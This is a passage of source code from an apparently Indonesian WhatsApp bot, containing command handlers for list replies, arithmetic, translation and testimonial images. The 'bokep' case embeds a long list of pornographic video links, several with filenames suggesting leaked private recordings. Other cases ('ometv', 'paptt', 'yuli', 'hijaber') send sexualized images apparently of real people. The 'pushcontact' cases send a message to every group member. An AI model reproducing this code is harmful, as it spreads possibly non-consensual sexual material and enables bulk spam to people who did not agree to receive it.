let teks = `Halo @${m.sender.split("@")[0]} berikut beberapa list yang tersedia saat ini.\n\n`
for (let i of db_respon_list) {
if (i.id === m.chat) {
teks += `- ${i.key.toUpperCase()}\n`
}
}
teks += `\n\nUntuk melihat detail produk, silahkan kirim nama produk yang ada pada list di atas. Misalnya kamu ingin melihat detail produk dari ${db_respon_list[0].key.toUpperCase()}, maka kirim pesan ${db_respon_list[0].key.toUpperCase()} kepada bot`
Al.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, {quoted:m}) 
}
limitAdd(m.sender, limit)
break
case 'dellist':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (db_respon_list.length === 0) return m.reply(`Belum ada list message di database`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *key*\n\n_Contoh_\n\n${prefix + command} hello`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return m.reply(`List respon dengan key *${q}* tidak ada di database!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
m.reply(`Sukses delete list message dengan key *${q}*`)
}
limitAdd(m.sender, limit)
break
case 'tambah':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text.includes('+')) return m.reply(`Gunakan dengan cara ${prefix+command} *angka* + *angka*\n\n_Contoh_\n\n${prefix+command} 1+2`)
arg = args.join(' ')
atas = arg.split('+')[0]
bawah = arg.split('+')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
m.reply(`${nilai_one + nilai_two}`)}
break
case 'kurang':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text.includes('-')) return m.reply(`Gunakan dengan cara ${prefix+command} *angka* - *angka*\n\n_Contoh_\n\n${prefix+command} 1-2`)
arg = args.join(' ')
atas = arg.split('-')[0]
bawah = arg.split('-')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
m.reply(`${nilai_one - nilai_two}`)}
break
case 'kali':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text.includes('*')) return m.reply(`Gunakan dengan cara ${prefix+command} *angka* * *angka*\n\n_Contoh_\n\n${prefix+command} 1*2`)
arg = args.join(' ')
atas = arg.split('*')[0]
bawah = arg.split('*')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
m.reply(`${nilai_one * nilai_two}`)}
break
case 'bagi':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!text.includes('/')) return m.reply(`Gunakan dengan cara ${prefix+command} *angka* / *angka*\n\n_Contoh_\n\n${prefix+command} 1/2`)
arg = args.join(' ')
atas = arg.split('/')[0]
bawah = arg.split('/')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
m.reply(`${nilai_one / nilai_two}`)}
break
case'addlist':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return m.reply(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return m.reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (/image/.test(mime)) {
let media = await Al.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
addResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
m.reply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
addResponList(m.chat, args1, args2, false, '-', db_respon_list)
m.reply(`Sukses set list message dengan key : *${args1}*`)
}
}
limitAdd(m.sender, limit)
break
case 'addtesti':{
if (!isCreator) return m.reply('Khusus Creator')
if (args.length < 1) return m.reply('Whats the image name?')
if (imagenya.includes(q)) return m.reply("Nama Testi Tersebut Sudah Ada")
let delb = await Al.downloadAndSaveMediaMessage(quoted)
imagenya.push(q)
await fsx.copy(delb, `./media/image/${q}.jpg`)
fs.writeFileSync('./media/database/image.json', JSON.stringify(imagenya))
fs.unlinkSync(delb)
m.reply(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'testimoni':{
let teks = '┌──࿐「 *Testi List* 」\n│\n'
for (let x of imagenya) {
teks += `│◦ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${imagenya.length}*`
m.reply(teks)
}
break
case 'deltesti':{
if (!isCreator) return m.reply('Khusus Creator')
if (args.length < 1) return m.reply('Enter the image name')
if (!imagenya.includes(q)) return m.reply("The name does not exist in the database")
let wanu = imagenya.indexOf(q)
imagenya.splice(wanu, 1)
fs.writeFileSync('./media/database/image.json', JSON.stringify(imagenya))
fs.unlinkSync(`./media/image/${q}.jpg`)
m.reply(`Success deleting image ${q}`)
}
break 
case 'pushcontact': {
    if (!isCreator) return m.reply()
      if (!m.isGroup) return m.reply(`The feature works only in grup`)
    if (!text) return m.reply(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    m.reply(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    Al.sendMessage(pler, { text: q})
     }  
     m.reply(`Done`)
      }
      break
case 'pushcontactv3': 
case 'pushcontact': {
if (!isCreator) return m.reply('*Khusus Owner Bot*')
if (!m.isGroup) return m.reply('Hanya bisa digunakan di dalam grup')
var namo = text.split('|')[0]
var chet = text.split('|')[1]
if (!name) return m.reply(`Masukan nama lu yang bener cok\n contoh: ${prefix+command} Wann|sv uy udh gw sv back`) 
if (!chet) return m.reply(`Masukan nama lu yang bener cok\n contoh: ${prefix+command} Wann|sv uy udh gw sv back`) 
let kontk = {
displayName: "Contact",
contacts: [{
displayName: namo,
vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;" + namo + ";;;\nFN:" + namo + "\nitem1.TEL;waid=" + m.sender.split('@')[0] + ":" + m.sender.split('@')[0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD"
}]
}
let pkDetect = await Al.groupMetadata(m.chat)
if (pkDetect.participants.length > 200) return m.reply('Batas member maksimal; 200')
m.reply('Gasken pushkontak total member ' + pkDetect.participants.length + ' member')
for (let a of pkDetect.participants) {
Al.sendMessage(a.id, {
contacts: kontk
})
await sleep(500)
Al.sendMessage(a.id, {
text: chet,
contextInfo:
{
"externalAdReply": {
"title": namabot, 
"body": `Ijin Pushkontak Om`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: myweb, 
thumbnailUrl: global.thumb, 
}
}
})
await sleep(500)
} // (?); kirim pesan ke semua peserta grup
m.reply('(Group: *' + pkDetect.subject + '*\nMember: ' + pkDetect.participants.length + '\ndelay: 500\nBERHASIL PUSH')
	}
break

case 'translate': case 'tr': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is high, please type ${prefix}The limit to check the limit`)
if (!text) return m.reply(`*Contoh* :

1. Kirim perintah ${prefix + command} *kode bahasa* *teks*
• Contoh : ${prefix + command} id halo
2. Reply chat dengan caption ${prefix + command} *kode bahasa*
• Contoh : ${prefix + command} id halo
Daftar bahasa yang di dukung : https://cloud.google.com/translate/docs/languages`)
let teks = m.quoted ? quoted.text : quoted.text.split(args[0])[1]
translate(teks, { to: args[0] }).then((res) => {
Al.sendText(m.chat, `${res.text}`, m)
})
}
limitAdd(m.sender, limit)
break
case 'listbahasa':
var clear = ["auto", "isSupported", "getCode"]
var teks = `*List Bahasa Yang Tersedia Di 𝐌𝐚𝐧𝐮𝐥 𝐎𝐟𝐜 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐦𝐞𝐧𝐭*\n\n`
for (let i in translate.languages) {
if (!clear.includes(i)) {
teks += `*${i}* untuk ${translate.languages[i]}\n`
}
}
m.reply(teks)
break

case 'bokep':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator && !isPremium) return m.reply('Khusus Developer & Premium')
await loading() 
const bokep = [
"https://media.discordapp.net/attachments/892359838405894156/1154009743959015514/Fanspage_-Lp2022_V_1.mp4",
"https://media.discordapp.net/attachments/892359838405894156/1154015550217912411/Fanspage_-_Lp2022_V_10.mp4",
"https://media.discordapp.net/attachments/892359838405894156/1154015550758993961/Fanspage_-_Lp2022_V_11.mp4",
"https://media.discordapp.net/attachments/892359838405894156/1154015551203582023/Fanspage_-_Lp2022_V_12.mp4",
"https://media.discordapp.net/attachments/892359838405894156/1154015551576866917/Fanspage_-_Lp2022_V_14.mp4",
"https://media.discordapp.net/attachments/892359838405894156/1154015551975342151/Fanspage_-_Lp2022_V_15.mp4",
"https://media.discordapp.net/attachments/892359838405894156/1154015552407347251/Fanspage_-_Lp2022_V_7.mp4",
"https://media.discordapp.net/attachments/892359838405894156/1154015552839352351/Fanspage_-_Lp2022_V_9.mp4",
"https://media.discordapp.net/attachments/892359838405894156/1154062643217313842/Fanspage_-_Lp2022_V_1.mp4",
"https://media.discordapp.net/attachments/892359838405894156/1154062643875811458/Fanspage_-_Lp2022_V_2.mp4",
"https://media.discordapp.net/attachments/892359838405894156/1154068203857784842/Fanspage_-_Lp2022_V_4.mp4",
"https://media.discordapp.net/attachments/892359838405894156/1154068204407242752/Fanspage_-_Lp2022_V_5.mp4",
"https://media.discordapp.net/attachments/892359838405894156/1154068204973465640/Fanspage_-_Lp2022_V_6.mp4",
"https://media.discordapp.net/attachments/892359838405894156/1154068835482206368/Fanspage_-_Lp2022_V_9.mp4",
"https://media.discordapp.net/attachments/892359838405894156/1154068836543373373/Fanspage_-_Lp2022_V_7.mp4",
"https://media.discordapp.net/attachments/892359838405894156/1154068837726167172/Fanspage_-_Lp2022_V_14.mp4",
"https://media.discordapp.net/attachments/892359838405894156/1154069445996724274/Fanspage_-Lp2022_V_2.mp4",
"https://cdn.discordapp.com/attachments/892359838405894156/1154088327616659528/BBFF.ME_-_Vids_62.mp4",
"https://cdn.discordapp.com/attachments/892359838405894156/1154088328107409588/BBFF.ME_-_Vids_60.mp4",
"https://cdn.discordapp.com/attachments/892359838405894156/1154088329017557063/BBFF.ME_-_Vids_61.mp4",
"https://cdn.discordapp.com/attachments/892359838405894156/1154088329608970321/BBFF.ME_-_Vids_55.mp4",
"https://cdn.discordapp.com/attachments/892359838405894156/1154090387389034577/BBFF.ME_-_Vids_52.mp4",
"https://cdn.discordapp.com/attachments/892359838405894156/1154090707095654470/BBFF.ME_-_Vids_51.mp4",
"https://cdn.discordapp.com/attachments/892359838405894156/1154090983315755078/BBFF.ME_-_Vids_53.mp4",
"https://cdn.discordapp.com/attachments/892359838405894156/1154091331451355226/BBFF.ME_-_Vids_54.mp4",
"https://cdn.discordapp.com/attachments/892359838405894156/1154091583466110996/BBFF.ME_-_Vids_57.mp4",
"https://cdn.discordapp.com/attachments/1140726537545593006/1141294001119567872/video0-1-2.mp4",
"https://cdn.discordapp.com/attachments/1140726537545593006/1141293988259827712/U3Mi5Hw.mp4",
"https://cdn.discordapp.com/attachments/1140726537545593006/1141293983386058813/lv_0_20230816011921_1.mp4",
"https://cdn.discordapp.com/attachments/1140726537545593006/1141293969402245240/freenude_7.mov",
"https://cdn.discordapp.com/attachments/1140726537545593006/1140734910810837002/yumi_yum_20230809_25.mp4",
"https://cdn.discordapp.com/attachments/1140726537545593006/1140734907635728544/video.mp4",
"https://cdn.discordapp.com/attachments/1140726537545593006/1140734902736797837/video0-1-1_6.mp4",
"https://cdn.discordapp.com/attachments/1140726537545593006/1140734892280393819/VID-20230803-WA0008.mp4",
"https://cdn.discordapp.com/attachments/1140726537545593006/1140734884508344350/OnlyNudes.mp4",
"https://cdn.discordapp.com/attachments/1140726537545593006/1140734869954101318/VID_20211203_143458_267.mp4",
"https://cdn.discordapp.com/attachments/1140726537545593006/1140734867739516938/VID_20211022_061512_085.mp4",
"https://cdn.discordapp.com/attachments/1140726537545593006/1140734865558487070/lv_0_20230809105917.mp4",
"https://cdn.discordapp.com/attachments/1140726537545593006/1140734630895562863/EminentGrossShelduck.mp4",
"https://cdn.discordapp.com/attachments/1140726537545593006/1140734625627516958/ImpartialCrookedCaimanlizard.mp4",
"https://cdn.discordapp.com/attachments/1140726537545593006/1140734612985876500/lv_0_20230806143018.mp4",
"https://cdn.discordapp.com/attachments/1140726537545593006/1140734597160771776/EvenResponsibleArizonaalligatorlizard.mp4",
"https://cdn.discordapp.com/attachments/1140726537545593006/1140734533940023347/azIPtJK.mp4",
"https://cdn.discordapp.com/attachments/1140726537545593006/1140734507348135936/BreakableQuaintEuropeanfiresalamander.mp4",
"https://cdn.discordapp.com/attachments/1140726537545593006/1140734507348135936/BreakableQuaintEuropeanfiresalamander.mp4",
"https://cdn.discordapp.com/attachments/1140726537545593006/1140734497223082174/4E67EE65-1A67-4984-91B3-51CD3077F102.mp4",
"https://cdn.discordapp.com/attachments/1140726525218537648/1141294698472943676/ImmenseSimplisticHamadryad-mobile.mov",
"https://cdn.discordapp.com/attachments/1140726525218537648/1141294691875291167/Evei.mp4",
"https://cdn.discordapp.com/attachments/1140726525218537648/1140735171402924144/VitalLongNightingale_1.mp4",
"https://cdn.discordapp.com/attachments/1140726525218537648/1140735167762276483/VID_20230806_133644_825.mp4.mp4",
"https://cdn.discordapp.com/attachments/1140726525218537648/1140735159524675584/VID_20230811_002105_203.mp4",
"https://cdn.discordapp.com/attachments/1140726525218537648/1140735151849099395/VID_20230710_165847_452.mp4",
"https://cdn.discordapp.com/attachments/1140726525218537648/1140735043816394783/ssstwitter.com_1683491163926.mp4",
"https://cdn.discordapp.com/attachments/1140726525218537648/1140735036732231770/twittervid.com_86fd4d.mp4",
"https://cdn.discordapp.com/attachments/1140726525218537648/1140735034475687976/received_706978464588651.mp4",
"https://cdn.discordapp.com/attachments/1140726525218537648/1140735014502412338/Pgk6gtZf.mp4",
"https://cdn.discordapp.com/attachments/1140726525218537648/1140735004121518221/1691351616800099.mp4",
"https://cdn.discordapp.com/attachments/1140726525218537648/1140735001990803529/1691942036192.mp4",
"https://cdn.discordapp.com/attachments/1140726525218537648/1140734993216327821/1691029779711327.mp4",
"https://cdn.discordapp.com/attachments/1140726525218537648/1140734985494593577/1892d643_IMG_4611.mp4",
"https://cdn.discordapp.com/attachments/1140726525218537648/1140734978792095794/1690656190024361.mp4",
"https://cdn.discordapp.com/attachments/1140726525218537648/1140734975080136858/1690644054647567.mp4",
"https://cdn.discordapp.com/attachments/1140726525218537648/1140734951420080209/825e83d85a2d4426be5173b76c762d98fe2c3982e26d8c6f413e5acb893182ca.mp4",
"https://cdn.discordapp.com/attachments/1140726525218537648/1140734942100332756/1eNkLboK.mp4",
"https://media.discordapp.net/attachments/1132049952307163187/1151952385229475880/RDT_20230914_214529.mp4",
"https://cdn.discordapp.com/attachments/1140732708604092446/1141294776667357224/trim.6DDF99FC-92DE-4CE1-847C-355C6D8A988D.mp4",
"https://cdn.discordapp.com/attachments/1140732708604092446/1141294770728218734/ssstwitter.com_1678142279915_Trim.mp4",
"https://cdn.discordapp.com/attachments/1140732708604092446/1141294767746056234/RPReplay_Final1683395552.mp4",
"https://cdn.discordapp.com/attachments/1140732708604092446/1140735521904132217/discord.gg-pantyhose_6.mp4",
"https://cdn.discordapp.com/attachments/1140732708604092446/1140735518448046102/VID_20230616_154636_088.mp4",
"https://cdn.discordapp.com/attachments/1140732708604092446/1140735514782224424/YouCut_20230814_032046619.mp4",
"https://cdn.discordapp.com/attachments/1140732708604092446/1140735508020989952/twitter_20220321_163123.mp4",
"https://cdn.discordapp.com/attachments/1140732708604092446/1140735472595914792/discord.gg-pantyhose_1.mov",
"https://cdn.discordapp.com/attachments/1140732708604092446/1140735469706027068/getvideobot.com-QCWdvhu7smE59nOH.mp4",
"https://cdn.discordapp.com/attachments/1140732708604092446/1140735466954567792/cm-chat-media-video-19a19bbdf-3d19-5dee-89d9-6f4c8a571b3252500.mp4",
"https://cdn.discordapp.com/attachments/1140732708604092446/1140735442489192659/discord.gg-pantyhose_8.mov",
"https://cdn.discordapp.com/attachments/1140732708604092446/1140735440228470824/discord.gg-pantyhose_6.mov",
"https://cdn.discordapp.com/attachments/1140732708604092446/1140735438416523324/discord.gg-pantyhose_2.mov",
"https://cdn.discordapp.com/attachments/1141336661196816395/1147116286011248730/RPReplay_Final1688071765.mov",
"https://cdn.discordapp.com/attachments/1141336661196816395/1147116236401029201/VID_20211027_011822_279_1.mov",
"https://cdn.discordapp.com/attachments/1141336661196816395/1141364474603909220/twitter_20220327_063338.mp4",
"https://cdn.discordapp.com/attachments/1141336661196816395/1141364458992709805/trim.F913257C-5DA2-42BD-AB2C-D8D7A187A136.mov",
"https://cdn.discordapp.com/attachments/1141336661196816395/1141364449438085211/trim.76F0BC89-C89B-41A1-A8E0-02359E1EED22.MOV",
"https://cdn.discordapp.com/attachments/1141336661196816395/1141364448775380992/trim.041E5B54-A7D9-4DBC-91BB-B36A5DBA5495.mov",
"https://cdn.discordapp.com/attachments/1141336661196816395/1141364449991737475/trim.9513C0DA-C58F-4D60-85E7-23E2680EDD30.mp4",
"https://cdn.discordapp.com/attachments/1141336661196816395/1141364438667100251/Q2zPHRB6QWDjDRLL_1.mp4",
"https://cdn.discordapp.com/attachments/1141336661196816395/1141364438088306799/RPReplay_Final1683009954.mov",
"https://cdn.discordapp.com/attachments/1141336661196816395/1141364439208185936/RDT_20230811_163851.mp4",
"https://cdn.discordapp.com/attachments/1132040784095481927/1151932298443358208/RDT_20230914_202442.mp4",
"https://cdn.discordapp.com/attachments/1132040784095481927/1151932189886390334/RDT_20230914_202436.mp4",
"https://cdn.discordapp.com/attachments/1132040784095481927/1151932044809613402/RDT_20230914_202429.mp4",
"https://cdn.discordapp.com/attachments/1132040784095481927/1151931984436805672/RDT_20230914_202421.mp4",
"https://media.discordapp.net/attachments/976381348501671986/1016438397771972638/BZ_I_SMILE_AMATEUR18.mp4",
"https://media.discordapp.net/attachments/976381348501671986/1008679005509132288/UnderstatedCloudyConure-mobile.mp4",
"https://media.discordapp.net/attachments/976381348501671986/1008679057921159239/HarmfulMeatyApisdorsatalaboriosa-mobile.mp4",
"https://media.discordapp.net/attachments/976381348501671986/1008679095795732520/AllSlushyGalapagossealion-mobile.mp4",
"https://media.discordapp.net/attachments/976381348501671986/1008679110953943071/YawningPhysicalGalapagossealion-mobile.mp4",
"https://media.discordapp.net/attachments/976381348501671986/1008679138850254849/WealthyUnevenEuropeanpolecat-mobile.mp4",
"https://cdn.discordapp.com/attachments/998958795453640787/998959369578360872/VID-20210623-WA0074.mp4",
"https://cdn.discordapp.com/attachments/998958795453640787/998959369976811621/VID_20220117_210939_083.mp4",
"https://cdn.discordapp.com/attachments/1015405107917094932/1052260114410778725/clubcity.amateur_1.mov",
"https://cdn.discordapp.com/attachments/525642910004150274/753443288475893951/VID_20200814_001917_121.mp4",
"https://cdn.discordapp.com/attachments/525642910004150274/757045949305454713/VID_20200920_040842_790.mp4",
"https://cdn.discordapp.com/attachments/525642910004150274/778655669896478730/4_5920437895834895912.mp4",
"https://cdn.discordapp.com/attachments/525642910004150274/751361164230918195/VID_20200904_112534_177.mp4",
"https://cdn.discordapp.com/attachments/715597787420426260/742899447851384872/u6JarF83akcli6cl.mp4",
"https://cdn.discordapp.com/attachments/658448682990960640/960561601646325840/oOJroMOq-f-_MdaJ.mp4",
"https://cdn.discordapp.com/attachments/786127715769909249/927775999893053450/CFNetworkDownload_Ofxrcx.tmp.mp4",
"https://media.discordapp.net/attachments/950113747505123388/950127840635015178/video0-6.mov",
"https://cdn.discordapp.com/attachments/786127715769909249/926548756831273061/received_562550898289131.mp4",
"https://cdn.discordapp.com/attachments/1132040804148457533/1151932817786294362/RDT_20230914_202707.mp4",
"https://cdn.discordapp.com/attachments/1132040804148457533/1151932774769512529/RDT_20230914_202704.mp4",
"https://cdn.discordapp.com/attachments/1132040804148457533/1151932672633995375/RDT_20230914_202642.mp4",
"https://cdn.discordapp.com/attachments/1132040804148457533/1151932558720905216/RDT_20230914_202638.mp4",
"https://cdn.discordapp.com/attachments/1132040804148457533/1151932468304285767/RDT_20230914_202635.mp4",
"https://cdn.discordapp.com/attachments/1132040804148457533/1146204468606672946/RDT_20230830_010438.mp4",
"https://cdn.discordapp.com/attachments/1132040804148457533/1146204353657581659/RDT_20230830_010407.mp4",
"https://cdn.discordapp.com/attachments/1132040804148457533/1146204257847083089/RDT_20230830_010331.mp4",
"https://cdn.discordapp.com/attachments/1004851938740936835/1020376516766466078/discord_53.mov",
"https://media.discordapp.net/attachments/1004851938740936835/1020376516766466078/discord_53.mov",
"https://cdn.discordapp.com/attachments/988401447609708564/990042611060449360/lela_big_ass_anal.mp4",
"https://cdn.discordapp.com/attachments/988401447609708564/990042761073926174/anal2.mov",
"https://cdn.discordapp.com/attachments/988401447609708564/990042933032018050/UnfitLimpingIndochinesetiger-mobile.mov",
"https://cdn.discordapp.com/attachments/988401447609708564/990043193406029824/anal3.mp4",
"https://cdn.discordapp.com/attachments/763851749164974081/946528636897480805/AabQ6qFF_NJ_G9IK-1.mp4",
"https://cdn.discordapp.com/attachments/763851749164974081/925830669429538846/933932108536.mp4",
"https://cdn.discordapp.com/attachments/763851749164974081/941111204611522570/VID_20220208_224416_945.mp4",
"https://cdn.discordapp.com/attachments/949254815144357898/969710620809236531/JOCYAFoagW9z.mp4",
"https://cdn.discordapp.com/attachments/940314344275738694/955471430743634000/4_5767083554500511991.mp4",
"https://cdn.discordapp.com/attachments/940314344275738694/953715160067997726/Brazzers_Anal8765.mp4",
"https://cdn.discordapp.com/attachments/940314344275738694/953715326594453595/LazyTenseEquine-mobile.mp4",
"https://media.discordapp.net/attachments/856946840275517451/856990751774343178/SneakyDelayedKusimanse-mobile.mp4",
"https://cdn.discordapp.com/attachments/949254815144357898/964110425476194344/video0-2-1.mp4",
"https://media.discordapp.net/attachments/990248094681686058/990642386801655828/VID-20220126-WA1168.mp4",
"https://media.discordapp.net/attachments/990248094681686058/990642386243837962/1636863130882.webm",
"https://media.discordapp.net/attachments/990248094681686058/990248922037502003/viddit_30ccf881.mp4",
"https://media.discordapp.net/attachments/990248094681686058/990248920716312606/anal.mp4",
"https://cdn.discordapp.com/attachments/644851830844686336/981947556781248562/InstructivePalatableDromaeosaur-mobile.mp4",
"https://cdn.discordapp.com/attachments/644851830844686336/981947612108308490/EagerCompleteSchnauzer-mobile.mp4",
"https://cdn.discordapp.com/attachments/644851830844686336/981947704076812318/PleasedSturdyClam-mobile.mp4",
"https://cdn.discordapp.com/attachments/942237158972985385/959631666509414461/1648830930288.webm",
"https://cdn.discordapp.com/attachments/644851830844686336/981947514938859560/VengefulCandidChanticleer-mobile.mp4",
"https://media.discordapp.net/attachments/976381345943146517/1010672144868442202/G7vrcDFzckFXnkSa.mp4",
"https://media.discordapp.net/attachments/976381345943146517/1010672144348364812/1638474418733.webm",
"https://media.discordapp.net/attachments/976381345943146517/1010672094205460650/1638261818285.webm",
"https://media.discordapp.net/attachments/976381345943146517/1010672093635031110/BleakRuralTeledu.mp4",
"https://media.discordapp.net/attachments/976381345943146517/1010672081026957332/MediumpurpleWeightyBluefintuna.mp4",
"https://media.discordapp.net/attachments/976381345943146517/1014167777499676734/masne_skarpetki_i_okulary.mp4",
"https://media.discordapp.net/attachments/976381345943146517/1014167776237211758/VID_20211027_151831_754.mp4",
"https://media.discordapp.net/attachments/976381345943146517/1010672433788891166/crempie_13.mp4",
"https://media.discordapp.net/attachments/976381345943146517/1010672433197486231/LD.webm",
"https://media.discordapp.net/attachments/976381345943146517/1010672426474025001/VID_20220502_001958_8830.mp4",
"https://media.discordapp.net/attachments/976381345943146517/1023185224428965888/Fppy_Bird__20220813_35.mp4",
"https://media.discordapp.net/attachments/976381345943146517/1023185201926516746/BZZanal.webm",
"https://media.discordapp.net/attachments/976381345943146517/1014167780624441394/Brazzers_.mp4",
"https://media.discordapp.net/attachments/973461865818636289/1002683549658390578/video-1.mp4",
"https://cdn.discordapp.com/attachments/1132040896251166771/1153330484407976058/RDT_20230918_170142.mp4",
"https://cdn.discordapp.com/attachments/1132040896251166771/1153330453315592212/RDT_20230918_170131.mp4",
"https://cdn.discordapp.com/attachments/1132040896251166771/1153330432365047900/RDT_20230918_170113.mp4",
"https://cdn.discordapp.com/attachments/1132040896251166771/1153330401817931858/RDT_20230918_170105.mp4",
"https://cdn.discordapp.com/attachments/1132040896251166771/1153330370985607270/RDT_20230918_170037.mp4",
"https://cdn.discordapp.com/attachments/1132040896251166771/1153330265310101674/RDT_20230918_170021.mp4",
"https://cdn.discordapp.com/attachments/1132040896251166771/1153330154102345799/RDT_20230918_170001.mp4",
"https://cdn.discordapp.com/attachments/1132040896251166771/1151934581252046989/RDT_20230914_203059.mp4",
"https://cdn.discordapp.com/attachments/1132040896251166771/1151934286858039406/RDT_20230914_203055.mp4",
"https://cdn.discordapp.com/attachments/1132040896251166771/1151934226573312030/RDT_20230914_203041.mp4",
"https://cdn.discordapp.com/attachments/1132040896251166771/1146204788086816818/RDT_20230830_010659.mp4",
"https://cdn.discordapp.com/attachments/1132040896251166771/1146204692708327554/RDT_20230830_010446.mp4",
"https://cdn.discordapp.com/attachments/921112075047149628/966777725673144420/Brazzers_Ass_19.mp4",
"https://cdn.discordapp.com/attachments/1132040896251166771/1146204586001047582/RDT_20230830_010421.mp4",
"https://cdn.discordapp.com/attachments/1048311650513588224/1051776032975364166/dDbBtTn-98251.mp4",
"https://cdn.discordapp.com/attachments/1048311650513588224/1051776032539148299/DaniLeighXoxo_1296113816703467521720P_1-FE09B.mp4",
"https://cdn.discordapp.com/attachments/1048311650513588224/1051775900443758622/ludmii_hl-20220425-0001-D5CC4.mp4",
"https://cdn.discordapp.com/attachments/1132040914525765812/1151935328219828294/RDT_20230914_203759.mp4",
"https://cdn.discordapp.com/attachments/1132040914525765812/1151935370892689488/RDT_20230914_203805.mp4",
"https://cdn.discordapp.com/attachments/1132040914525765812/1151935501281009817/RDT_20230914_203752.mp4",
"https://cdn.discordapp.com/attachments/1132040914525765812/1151935774078541904/RDT_20230914_203816.mp4",
"https://cdn.discordapp.com/attachments/1132040914525765812/1151935264948764672/RDT_20230914_203747.mp4",
"https://cdn.discordapp.com/attachments/930019660974407701/964605558940385341/SubstantialTubbyCrownofthornsstarfish-mobile.mp4",
"https://cdn.discordapp.com/attachments/930019660974407701/964605437104250880/Tren2.mp4",
"https://cdn.discordapp.com/attachments/930019660974407701/964604614500560917/MIRD-187_A_King_Who_Lives_With_Ten_Obedient_Maids-Chapter_2-_Javhaven_JAV_tube.mp4-2021-Jul-12_15-15.mp4",
"https://cdn.discordapp.com/attachments/930019660974407701/964606108297744434/SpankBang.com_rickyjohnsonkendraspadefuckatparty_720p_002-1.mp4",
"https://cdn.discordapp.com/attachments/706074188875825152/965584088104828978/DeepGraciousCowbird-mobile.mp4",
"https://cdn.discordapp.com/attachments/706074188875825152/965631054637576192/received_326672366231713.mp4"]
const bokepnya = bokep[Math.floor(Math.random() * bokep.length)]
Al.sendMessage(m.chat, {video: { url: bokepnya }, viewOnce: true, caption: 'Sange Jir'}, { quoted: m})
}
break
case 'ometv':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator&&!isPremium) return m.reply('Khusus Developer & Premium')
await loading() 
const { ometv } = require('./media/asupan/ometv') 
const omek = ometv[Math.floor(Math.random() * ometv.length)]
Al.sendMessage(m.chat, {
    video: { url: omek },
    viewOnce: true,
    caption: 'cih sange',
    }, { quoted: m});
}
break
case 'yuli':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator&&!isPremium) return m.reply('Khusus Developer & Premium')
await loading() 
const { yuli } = require('./media/asupan/yuli')
const yulinya = yuli[Math.floor(Math.random() * yuli.length)]
Al.sendMessage(m.chat, {image:{url: yulinya}}, {quoted:m})
}
limitAdd(m.sender, limit)
break
case 'hijaber':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator&&!isPremium) return m.reply('Khusus Developer & Premium')
await loading() 
const { hijaber } = require('./media/asupan/hijaber')
const hijab = hijaber[Math.floor(Math.random() * hijaber.length)]
Al.sendMessage(m.chat, {image:{url: hijab}}, {quoted:m})
}
limitAdd(m.sender, limit)
break

case 'paptt':{
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!isCreator&&!isPremium) return m.reply('Khusus Developer & Premium')
await loading() 
const { paptt } = require('./media/asupan/paptt') 
const tt = paptt[Math.floor(Math.random() * paptt.length)]
Al.sendMessage(m.chat, {
    image: { url: tt },
    viewOnce: true,
    caption: 'Dasar sange',
    }, { quoted: m});
}
break	
case 'reqpesanan':{
if(!text) return m.reply('*exemple*\n\n.reqpesanan vps 1gb')
Al.sendMessage(global.owner + '@s.whatsapp.net', { text: `*Hai Creator*\nada pesanan nih\n*Pesanan:* ${text}\n*Dari:*\n*@${m.sender.split('@')[0]}`, mentions: [m.sender]}, { quoted: m })
m.reply('Pesanan Sudah Terkirim Kak Tunggu Owner Chat Kakak Ya Terimakasih Sudah Memesan')
}
break
case 'quotesimage':
case 'shinobu':
case 'wallnime':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Your limit is up, please send ${prefix}The limit to check the limit`)
await loading()
Al.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}` } })
}
limitAdd(m.sender, limit)
break   
